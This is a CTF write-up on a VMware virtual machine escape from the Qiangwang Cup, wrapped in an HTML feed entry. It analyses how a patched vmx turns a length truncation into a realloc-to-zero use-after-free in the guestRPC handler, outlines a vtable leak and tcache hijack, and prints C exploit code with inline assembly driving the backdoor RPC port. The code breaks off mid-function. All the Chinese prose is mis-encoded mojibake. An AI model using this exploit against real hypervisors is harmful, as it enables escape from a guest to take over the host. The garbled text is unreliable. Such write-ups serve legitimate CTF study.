    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº:<a href="https://forum.butian.net/share/1678">https://forum.butian.net/share/1678</a></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åˆæ¬¡åˆ†æè™šæ‹Ÿæœºé€ƒé€¸ï¼Œä¹‹å‰åˆ†æäº†ä¸€ç¯‡rwctf2018ï¼Œè¿™æ¬¡è§†çº¿è½¬åˆ°å¼ºç½‘æ¯çš„ä¸€ä¸ªè™šæ‹Ÿæœºé€ƒé€¸åˆ†æã€‚éš¾åº¦æ¯”rwå¤§ä¸€ç‚¹ç‚¹ï¼Œä½†æ˜¯é€†å‘åˆ†æè¿˜æ˜¯é‡ç‚¹ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šå·®åˆ°å“ªé‡Œå»ã€‚</p><p>ä¸€äº›æœ‰å…³åŸºç¡€çš„é“¾æ¥æ”¾åœ¨è¿™é‡Œï¼Œä¸åšèµ˜è¿°ã€‚</p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">é¢˜è§£</a></p><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">RPC&#x2F;backdooræœºåˆ¶</a></p><h2 id="0x01-åˆ†æ"><a href="#0x01-åˆ†æ" class="headerlink" title="0x01 åˆ†æ"></a>0x01 åˆ†æ</h2><h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><p>è¿™ç±»é¢˜ç›®éƒ½ä¼šç»™ä¸€ä¸ªpatchedçš„vmxæ–‡ä»¶ï¼Œå®‰è£…vmwareåï¼Œåœ¨<code>/usr/lib/vmware/bin</code>ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ°ç›®æ ‡vmxã€‚ä½¿ç”¨bindiffæ¯”è¾ƒpatchedå’Œpatchä¹‹å‰çš„åŒºåˆ«å¯ä»¥è¿…é€Ÿå®šä½æ¼æ´çš„ä½ç½®ã€‚</p><p>ï¼ˆbindiffåˆ†æå¤ªæ…¢äº†ï¼Œè¿™æ¬¡é€‰æ‹©äº†010ï¼‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-89eec2810b186d524efda555894cca9031ad35e7.png" alt="å›¾ç‰‡.png"></p><p>æœ‰ä¸‰å¤„ä¸åŒï¼Œidaå®šä½åˆ°å…³é”®ä½ç½®ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-18b396ee70885b34dc4b57846efde51baa0d1a1f.png" alt="å›¾ç‰‡.png"></p><p>ä¸€å¤„æŠŠr12dæ”¹æˆäº†r12wï¼Œç›¸å½“äºçœç•¥äº†r12çš„é«˜ä½ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b9b1beba56c3803f31e032d2c8476ce9c7d9fda8.png" alt="å›¾ç‰‡.png"></p><p>æŠŠè·³è½¬çš„æ¡ä»¶æ”¹ä¸ºäº†å¤§äºç­‰äºã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a25862dfd05d6be26c03539e4ccba81caefc64ab.png" alt="å›¾ç‰‡.png"></p><p>è·³è½¬æ”¹ä¸ºäº†æ— æ¡ä»¶ã€‚</p><p>æœ€åä¸€ä¸ªæ”¹å˜ï¼Œå–æ¶ˆäº†æ¡ä»¶æ£€æŸ¥ï¼Œå‰ä¸¤å¤„patchæ”¹å˜å¦‚ä¸‹ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2c772477f3bc5dde104c35b1d042d567f8c8da28.png" alt="å›¾ç‰‡.png"></p><p>æœ¬èƒ½çš„ååº”å°±æ˜¯reallocå‡½æ•°çš„æ¼æ´ï¼Œè¿™ç±»é¢˜åœ¨å¸¸è§„pwnä¸­å¾ˆå¸¸è§ï¼Œreallocå‡½æ•°ç¬¬äºŒä¸ªsizeå‚æ•°å¦‚æœä¸º0ï¼Œåˆ™å’Œfreeæ•ˆæœä¸€æ ·ï¼Œå¸¸å¸¸ä¼šå¯¼è‡´DFã€UAF.æ¥ä¸‹æ¥ç»†çœ‹ä¸€ä¸‹ä¼ªä»£ç ã€‚</p><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>Vmxæ¼æ´ä¾ç„¶ä½äºguestRPCçš„å¤„ç†å‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°ä¸­ä½¿ç”¨äº†ä¸€ä¸ªå¤§çš„switchå¤„ç†ä¸åŒçš„ä¿¡æ¯ã€‚æ¥ä¸‹æ¥è¯¦ç»†åˆ†æã€‚ï¼ˆè™šæ‹Ÿæœºé€ƒé€¸ï¼ˆä¸€ï¼‰ä¸­åªç»™äº†åˆ†æçš„ç»“æ„ä½“ï¼‰</p><p>å…³äºä¸€äº›åŸºç¡€çŸ¥è¯†å¯ä»¥çœ‹<a href="">è™šæ‹Ÿæœºé€ƒé€¸ï¼ˆä¸€ï¼‰</a></p><h4 id="Open-RPC-channel"><a href="#Open-RPC-channel" class="headerlink" title="Open_RPC_channel"></a>Open_RPC_channel</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f4c153972dee2b077f41122e57c31023c87979c.png" alt="å›¾ç‰‡.png"></p><p>è¿™æ˜¯switchä¸‹æœ€ç®€å•çš„ä¸€ä¸ªåˆ†æ”¯äº†ï¼Œæ‰“å¼€ä¿¡é“ï¼Œå†…å®¹å°±æ˜¯ç®€å•çš„æ¥å—æ•°æ®åŒ…ï¼Œç„¶åè·å¾—magicnumï¼ˆè¿™éƒ¨åˆ†æ˜¯è°ƒè¯•å¾—åˆ°çš„ï¼‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4ac942da8b78bba6ed812cf7878a8b0b70561da5.png" alt="å›¾ç‰‡.png"></p><p>magicnumä¼šè¿›è¡Œä¸€ä¸ªæ¯”è¾ƒå¦‚æœå¤±è´¥å°±ç›´æ¥é€€å‡ºã€‚</p><h4 id="Send-RPC-command-length"><a href="#Send-RPC-command-length" class="headerlink" title="Send_RPC_command_length"></a>Send_RPC_command_length</h4><p>é¦–å…ˆåˆ¤æ–­<code>byte_FE9584</code>ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªé­”æ•°ï¼Œæ¥ç€å°±åˆ¤æ–­é•¿åº¦ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3612cc7def195cc1c26ad8199975b01b1c452eb0.png" alt="å›¾ç‰‡.png"></p><p>é•¿åº¦ä¸º-1æˆ–è€…å¤§äº0x10000å°±ä¼šæŠ¥é”™ã€‚å¦‚æœRPCIçš„é•¿åº¦ç¬¦åˆå°±ä¼šç»§ç»­å¾€ä¸‹èµ°ã€‚!</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-38b67aa4103d4bfdb748b0cab800ba051690af6b.png" alt="å›¾ç‰‡.png"><br> åœ¨è¿™ä¸ªåˆ¤æ–­ä¸­ï¼Œæ¯”è¾ƒ56å’Œ21åç§»å¤„çš„å€¼ï¼Œv56ä¸ºæ¥æ”¶åˆ°çš„æ•°æ®åŒ…ï¼Œv21ä¸ºç°æœ‰é•¿åº¦ï¼Œå¦‚æœæ•°æ®é•¿åº¦å¤§äºç°æœ‰é•¿åº¦åˆ™reallocé‡æ–°åˆ†é…ï¼Œè®¾ç½®ç©ºé—´å¤§å°ä¸ºæ–°çš„å¤§å°ï¼Œä¸”ä¿®æ”¹msg_structã€‚</p><p>æ¼æ´å°±å‡ºåœ¨è¿™ä¸ªéƒ¨åˆ†ã€‚æ¼æ´å­˜åœ¨çš„æ¯”è¾ƒéšç§˜ï¼Œå¤§ä½“å±äºæ•´å½¢æº¢å‡ºã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ac0faf0ad5f12e77c733f85edc1914098b407865.png" alt="å›¾ç‰‡.png"></p><p>æ­¤å¤„ï¼Œå¤„ç†sizeçš„æ—¶å€™åŠ å…¥äº†LOWORDä¿®é¥°ï¼Œå¯¼è‡´dword-&gt;wordé«˜ä½å¤±å»ï¼Œæ‰€ä»¥å¦‚æœè®¾ç½®v56&#x3D;0xffffåˆ™å¯ä»¥é€šè¿‡å¤§å°åˆ¤æ–­ï¼Œç„¶åLOWORD(0xffff+1)&#x3D;LOWORD(0x10000)&#x3D;0ï¼Œåˆ™æ­¤æ—¶çš„reallocç¬¬äºŒä¸ªå‚æ•°ä¸º0ï¼Œè¿è¡Œæ—¶é‡æ–°å›æ”¶ptrã€‚ä¹Ÿæ²¡æœ‰æ¸…0.å¯¼è‡´äº†ptrçš„UAFåˆ©ç”¨ã€‚</p><h4 id="Send-RPC-command-data"><a href="#Send-RPC-command-data" class="headerlink" title="Send_RPC_command_data"></a>Send_RPC_command_data</h4><p>é¦–å…ˆè¯»å…¥äº†éœ€è¦å‘é€çš„dataæŒ‡ä»¤ï¼Œç„¶åè¯»å–RPCIç»“æ„ä½“ï¼Œæ ¹æ®å‰é¢è®¾ç½®çš„é•¿åº¦ï¼Œä»¥ä¸åŒçš„æ–¹å¼å‘é€msgï¼Œä¸€æ¬¡æœ€å¤šå‘é€å››ä¸ªå­—èŠ‚ï¼Œå››ä¸ªå­—èŠ‚ä»¥å†…å‘é€çš„æ–¹å¼éƒ½æ˜¯ä¸€ä¸ªbyteä¸€ä¸ªbyteçš„å¤åˆ¶ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-36a2bba083009f75ce800f244312c2430730e108.png" alt="å›¾ç‰‡.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5ba2447ff1d948dcf05d645861baddbc9ae0718.png" alt="å›¾ç‰‡.png"></p><p>å‘é€å®ŒæŒ‡ä»¤ä¹‹åï¼Œåˆ¤æ–­æ˜¯å¦å‘é€å®Œï¼Œå¦‚æœå‘é€å®Œäº†åˆ™è¿›å…¥æŒ‡ä»¤å¤„ç†ï¼Œæ ¹æ®ä¸€ä¸ªç±»ä¼¼è™šè¡¨çš„bssæ®µæŒ‡é’ˆï¼Œæ‰§è¡ŒæŸä¸ªå‡½æ•°rw2018ä¸­ï¼Œæœ€åå°±æ˜¯åŠ«æŒäº†è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼Œè®©æˆ‘ä»¬æˆåŠŸé€ƒé€¸ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-163cb20a6e28b6d9bce90892deae335522c69b65.png" alt="å›¾ç‰‡.png"><br> å¤„ç†å®Œä¹‹åï¼Œflagæ ‡å¿—ä¸ºè®¾ç½®ä¸º1.å…·ä½“çš„æŒ‡ä»¤å¯ä»¥æœç´¢å­—ç¬¦ä¸²ï¼Œä¹‹å‰åˆ†æçš„rw2018ä¸­ä¹Ÿæœ‰ç›¸åº”çš„åˆ†æï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°ã€‚</p><h4 id="Recieve-RPC-reply-length"><a href="#Recieve-RPC-reply-length" class="headerlink" title="Recieve_RPC_reply_length"></a>Recieve_RPC_reply_length</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9589e548acbe430d797a4b712db305520f4cd8bd.png" alt="å›¾ç‰‡.png"></p><p>guestè·å¾—ï¼Œè¿”å›çš„é•¿åº¦ï¼Œé€»è¾‘ç®€å•ã€‚</p><h4 id="Recieve-RPC-reply-data"><a href="#Recieve-RPC-reply-data" class="headerlink" title="Recieve_RPC_reply_data"></a>Recieve_RPC_reply_data</h4><p>æ‰§è¡ŒæŒ‡ä»¤ä¹‹åè¿”å›çš„æ•°æ®ã€‚</p><p>é€»è¾‘å’Œå‘é€å·®ä¸å¤šï¼ŒåŒæ ·çš„å…ˆæ”¶åˆ°é•¿åº¦ï¼Œç„¶ååˆ¤æ–­é•¿åº¦ï¼Œä¸€æ¬¡æ¥å—å››ä¸ªå­—èŠ‚ï¼Œç„¶åå†æŠŠæ•°æ®è½¬ç§»åˆ°ç¼“å†²åŒºã€‚æœ€åè®¾ç½®flagä¸ºå‘é€å®Œæ¯•ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5554b4d6edff9e2280409f6bd2c8cd2c86fea21f.png" alt="å›¾ç‰‡.png"></p><h4 id="Finish-receiving-RPC-reply-amp-Close-RPC-channel"><a href="#Finish-receiving-RPC-reply-amp-Close-RPC-channel" class="headerlink" title="Finish_receiving_RPC_reply &amp; Close_RPC_channel"></a>Finish_receiving_RPC_reply &amp; Close_RPC_channel</h4><p>è¿™ä¸¤ä¸ªéƒ¨åˆ†ä¹Ÿè¾ƒä¸ºç®€å•ï¼Œå‰è€…åœ¨rw2018è¯¦ç»†åˆ†æè¿‡ï¼Œåè€…å°±æ˜¯close channelã€‚åŒæ—¶è®¾ç½®flagä¸º1ï¼Œæ•´ä¸ªæŒ‡ä»¤å¤„ç†å‘é€æ¥æ”¶æµç¨‹ç»“æŸã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>å‰é¢è¯´è¿‡äº†ï¼Œæ¼æ´å­˜åœ¨äºreallocä¸­ï¼Œåˆ©ç”¨è¯¥UAFå¯ä»¥é€ æˆæ³„éœ²ç­‰æ“ä½œã€‚å®é™…ä¸Šleakå’Œåˆ©ç”¨çš„æ€è·¯è¿˜æ˜¯å’Œrwå·®ä¸å¤šçš„ã€‚</p><p>æ­¤å¤„çš„UAFä½ç½®åœ¨reallocç¯èŠ‚ä¹Ÿå°±æ˜¯è®¾ç½®å‘é€é•¿åº¦çš„ç¯èŠ‚ï¼Œä½†æ˜¯é€ æˆUAF leakè™šè¡¨è¿˜æ˜¯éœ€è¦å…ˆè®¾ç½®ä¸€ä¸ª0x100å¤§å°çš„ç¼“å†²åŒºã€‚</p><ul><li>å¼€å¯channel A channel B</li><li>Aè®¾ç½®bufferä¸º0x100ï¼Œ B ä½¿ç”¨info getä¹Ÿè®¾ç½®ä¸º0x100</li><li>ç„¶åset_lenè§¦å‘Aæ¼æ´ï¼ŒB getè¿™ä¸ªbufferï¼ŒAå†æ¬¡è§¦å‘æ¼æ´ã€‚æ­¤æ—¶B çš„bufferå·²ç»åœ¨tcacheé‡Œäº†</li><li>è°ƒç”¨dnd_visonå‡½æ•°å†™å…¥è™šè¡¨</li><li>leak</li></ul><p>æ¼æ´åˆ©ç”¨ä¹Ÿæ˜¯å’Œrwä¸€æ ·ï¼Œç›´æ¥tcacheåŠ«æŒå³å¯</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p>ä¸»è¦çš„æµç¨‹è¿˜æ˜¯å¤åˆ¶rw2018çš„ï¼Œæ”¹åŠ¨å°‘éƒ¨åˆ†å³å¯ã€‚è¿˜æ˜¯å¯¹å¸ˆå‚…çš„è„šæœ¬åˆ†æ</p><p>leakå‡½æ•°</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4b9fefc7745ee94ae07cccc09bfdcb91cf0fb928.png" alt="å›¾ç‰‡.png"></p><p>å®Œæ•´çš„channel 0 å‘é€æŒ‡ä»¤</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6ac75d5867ddf6d2826a4909d4a23d798ecc4e9.png" alt="å›¾ç‰‡.png"></p><p>channelå‘é€éƒ¨åˆ†info get</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a5dfc228eaf5bbe1046ff8828591417ae8e7d130.png" alt="å›¾ç‰‡.png"></p><p>free channel 0 çš„bufferï¼Œç„¶ååœ¨channel 1reallocå‡ºæ¥ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf4ca0bca038198b936f068479e3d7c86b304719.png" alt="å›¾ç‰‡.png"></p><p>å†æ¬¡free</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6101b8e1bf488c5b22fc638bf5ee6759f7e47d59.png" alt="å›¾ç‰‡.png"></p><p>dnd_verisonæ‰“å…¥è™šè¡¨</p><p>tcacheåŠ«æŒæ“ä½œä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ”¹æ‰äº†è§¦å‘çš„ä½ç½®ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x49435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token 